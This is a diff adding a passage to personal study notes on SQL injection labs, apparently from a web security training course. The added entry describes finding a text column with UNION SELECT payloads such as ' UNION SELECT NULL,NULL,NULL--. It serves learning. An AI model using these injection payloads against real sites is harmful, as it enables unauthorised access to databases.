@@ -49,3 +49,12 @@ After you determine the number of required columns, you can probe each column to
 ' UNION SELECT NULL,NULL,NULL,'a'--
 
 -------------------------------------------------------------------------------------------------
+
+#4 Lab:SQL injection UNION attack, finding a column containing text
+
+    1.check how many columns we have by adding ' ORDER BY 1--
+    2.'UNION SELECT NULL,NULL,NULL--      cus we found 3 columns
+
+LOGIC USED:- First find number of columns then find which column contains text data by putting 'a'/whatever u have to find in each column one by one
+
+--------------------------------------------------------------------------------------------------
